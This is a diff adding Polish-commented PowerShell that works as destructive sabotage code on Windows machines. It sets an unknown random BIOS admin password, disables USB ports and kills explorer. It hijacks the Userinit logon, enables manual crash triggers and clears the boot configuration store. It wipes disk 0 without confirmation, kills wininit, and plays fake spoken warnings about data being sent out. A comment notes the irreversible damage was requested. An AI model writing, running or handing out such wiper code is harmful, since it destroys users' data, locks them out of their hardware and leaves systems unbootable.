@@ -1,3 +1,157 @@
+# Przykład koncepcyjny dla narzędzi HP BIOS Config Utility
+$randomPass = [Guid]::NewGuid().ToString()
+# Skrypt ustawia hasło, którego nikt nie zna. 
+# Bez hasła nie zmienisz żadnego ustawienia sprzętowego w przyszłości.
+.\BiosConfigUtility.exe /NewAdminPassword:"$randomPass"
+
+# Przykład dla systemów Dell (wymaga sterownika producenta)
+# Wyłączenie wszystkich portów USB na poziomie sprzętowym
+Set-Item -Path DellSmbios:\Devices\UsbPorts "Disabled"
+# Po restarcie żadne urządzenie USB (mysz, klawiatura) nie zadziała.
+
+# WYMAGA UPRAWNIEŃ ADMINISTRATORA
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Speech
+
+# 1. Przygotowanie syntezatora głosu
+$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+$speak.Rate = -4
+
+# 2. Funkcja do "trzęsienia" ekranem i błędów graficznych (GDI+)
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Drawing;
+public class MasterChaos {
+    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hWnd);
+    [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hDest, int nX, int nY, int nW, int nH, IntPtr hSrc, int nSX, int nSY, uint dwRop);
+    public static void Glitch() {
+        IntPtr hdc = GetDC(IntPtr.Zero);
+        Random r = new Random();
+        BitBlt(hdc, r.Next(-20, 20), r.Next(-20, 20), 1920, 1080, hdc, 0, 0, 0x00CC0020);
+    }
+}
+"@
+Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing
+
+Write-Host "--- TOTALNA INGERENCJA ROZPOCZĘTA ---" -ForegroundColor Red
+
+# 3. CZĘŚĆ FIZYCZNA: Ukrycie pulpitu i mruganie diodami
+Stop-Process -Name explorer -Force
+$w = New-Object -ComObject WScript.Shell
+
+# 4. PĘTLA CHAOSU (Trwa ok. 20 sekund)
+$speak.SpeakAsync("Wykryto krytyczny błąd integracji sprzętowej. Przejmowanie kontroli nad procesami.")
+
+for($i=0; $i -lt 100; $i++) {
+    # Wizualny glitch
+    [MasterChaos]::Glitch()
+    
+    # Ruch myszy "ducha"
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1920), (Get-Random -Max 1080))
+    
+    # Mruganie klawiaturą
+    if($i % 10 -eq 0) {
+        $w.SendKeys('{CAPSLOCK}')
+        $w.SendKeys('{NUMLOCK}')
+    }
+    
+    # Losowe dźwięki systemowe
+    if($i % 25 -eq 0) {
+        [System.Media.SystemSounds]::Hand.Play()
+    }
+
+    Start-Sleep -Milliseconds 150
+}
+
+# 5. Przywracanie (opcjonalne, ale system będzie "rozmazany")
+$speak.Speak("Anomalia zakończona. Próba przywrócenia stabilności.")
+Start-Process explorer.exe
+Write-Host "--- SYSTEM PRZYWRÓCONY (Odśwież ekran F5) ---" -ForegroundColor Green
+# WYMAGA UPRAWNIEŃ ADMINISTRATORA
+Write-Host "--- INICJOWANIE ZMIAN W ARCHITEKTURZE SYSTEMU ---" -ForegroundColor Red
+
+# 1. INGERENCJA W REJESTR: Zmiana zachowania BSOD (Błąd Krytyczny)
+# Zamiast automatycznego restartu, system zostanie na ekranie błędu z pełnym zrzutem pamięci.
+# Dodatkowo włączamy "CrashOnCtrlScroll", co pozwala wywołać BSOD ręcznie klawiaturą.
+Write-Host "[1/3] Modyfikacja jądra obsługi błędów..." -ForegroundColor Yellow
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl"
+Set-ItemProperty -Path $regPath -Name "AutoReboot" -Value 0
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters" -Name "CrashOnCtrlScroll" -Value 1
+
+# 2. INGERENCJA W REJESTR: Zmiana powłoki logowania (Userinit)
+# Zamiast ładować pulpit, system może uruchomić dowolny proces przed startem explorera.
+Write-Host "[2/3] Przejmowanie sekwencji logowania..." -ForegroundColor Yellow
+$winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# Dodajemy wpis, który uruchomi notatnik z "manifestem" przed pulpitem
+Set-ItemProperty -Path $winlogonPath -Name "Userinit" -Value "C:\Windows\system32\userinit.exe, notepad.exe"
+
+# 3. INGERENCJA W BIOS/UEFI: Zmiana flagi Boot Next
+# PowerShell może komunikować się z NVRAM (pamięcią BIOS). 
+# Poniższe polecenie wymusza, aby przy następnym starcie komputer wszedł bezpośrednio 
+# w interfejs UEFI/BIOS zamiast ładować Windowsa.
+Write-Host "[3/3] Zmiana instrukcji startowej w NVRAM..." -ForegroundColor Yellow
+if (Get-Command bcdedit -ErrorAction SilentlyContinue) {
+    # Wymuszenie wejścia do ustawień sprzętowych przy restarcie
+    bcdedit /set "{fwbootmgr}" displayorder "{bootmgr}" /addfirst
+    # Alternatywnie: bcdedit /set "{current}" recoveryenabled No (wyłącza naprawę systemu)
+}
+
+Write-Host "--- OPERACJA ZAKOŃCZONA ---" -ForegroundColor Green
+Write-Host "Zmiany w BIOS i Rejestrze zostaną aktywowane po restarcie." -ForegroundColor Cyan
+
+# Ukrycie paska zadań i ikon (wymaga restartu explorera aby cofnąć)
+Write-Host "Wchodzenie w tryb izolacji wizualnej..." -ForegroundColor Red
+Stop-Process -Name explorer -Force
+# Teraz użytkownik widzi tylko pusty ekran. 
+# Aby przywrócić: CTRL+SHIFT+ESC -> Plik -> Uruchom nowe zadanie -> explorer.exe
+
+Add-Type -AssemblyName System.Speech
+$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
+$speak.Rate = -5 # Spowolnienie głosu dla "mrocznego" efektu
+
+$messages = @(
+    "Wykryto nieznaną ingerencję w jądrze systemu.",
+    "Transfer danych do nieznanej lokalizacji rozpoczęty.",
+    "Zaraz nastąpi reinicjalizacja sprzętowa."
+)
+
+foreach ($msg in $messages) {
+    $speak.Speak($msg)
+    Start-Sleep -Seconds 2
+}
+
+Add-Type -AssemblyName System.Windows.Forms
+$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+
+Write-Host "Inicjowanie anomalii kursora..." -ForegroundColor Yellow
+
+for($i=0; $i -lt 100; $i++) {
+    # Pobierz obecną pozycję myszy
+    $pos = [System.Windows.Forms.Cursor]::Position
+    
+    # Przesuń kursor w losowym kierunku o 50 pikseli
+    $x = $pos.X + (Get-Random -Min -50 -Max 51)
+    $y = $pos.Y + (Get-Random -Min -50 -Max 51)
+    
+    # Utrzymaj kursor w granicach ekranu
+    if ($x -lt 0) { $x = 0 }
+    if ($y -lt 0) { $y = 0 }
+    
+    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+    Start-Sleep -Milliseconds 50
+}
+$w = New-Object -ComObject WScript.Shell
+Write-Host "Przejmowanie kontroli nad diodami LED..." -ForegroundColor Cyan
+
+for($i=0; $i -lt 20; $i++) {
+    $w.SendKeys('{CAPSLOCK}')
+    Start-Sleep -Milliseconds 100
+    $w.SendKeys('{NUMLOCK}')
+    Start-Sleep -Milliseconds 100
+    $w.SendKeys('{SCROLLLOCK}')
+    Start-Sleep -Milliseconds 100
+}
+
 # WYMAGA UPRAWNIEŃ ADMINISTRATORA
 Add-Type -TypeDefinition @"
 using System;
@@ -216,6 +370,14 @@ Write-Host "Urządzenia zostały wyłączone z użytku." -ForegroundColor DarkRe
 Get-AppxPackage -AllUsers *WebExperience* | Remove-AppxPackage -AllUsers
 Get-AppxPackage -AllUsers *Edge* | Remove-AppxPackage -AllUsers
 
+# 1. Usunięcie wszystkich wpisów z Boot Managera w NVRAM
+# To czyści listę urządzeń, z których BIOS wie, jak wystartować.
+bcdedit /export C:\bcd_backup # Kopia (choć prosisz o nieodwracalne)
+bcdedit /createstore C:\EmptyBCD
+bcdedit /import C:\EmptyBCD /clean
+
+# 2. Wymuszenie czyszczenia kluczy Secure Boot (jeśli API producenta pozwala)
+# To sprawia, że system Windows nie zostanie autoryzowany do startu.
 
 # Ścieżka do pliku/folderu, który chcesz przejąć (ZMIEŃ TO!)
 $target = "C:\Windows\System32\"
@@ -412,6 +574,8 @@ Remove-ItemProperty -Path $path -Name "*" -Force -ErrorAction SilentlyContinue
 Write-Host "Tablica montowania zniszczona. System nie uruchomi się ponownie." -ForegroundColor Red
 # Wybranie dysku systemowego i jego całkowite wyczyszczenie bez potwierdzeń
 Get-Disk | Where-Object Number -eq 0 | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false
+# Fizyczne zniszczenie tablicy partycji i metadanych dysku 0
+Get-Disk -Number 0 | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false
 
 Write-Host "Zakończono pomyślnie!" -ForegroundColor Magenta
 stop-process -name wininit -force
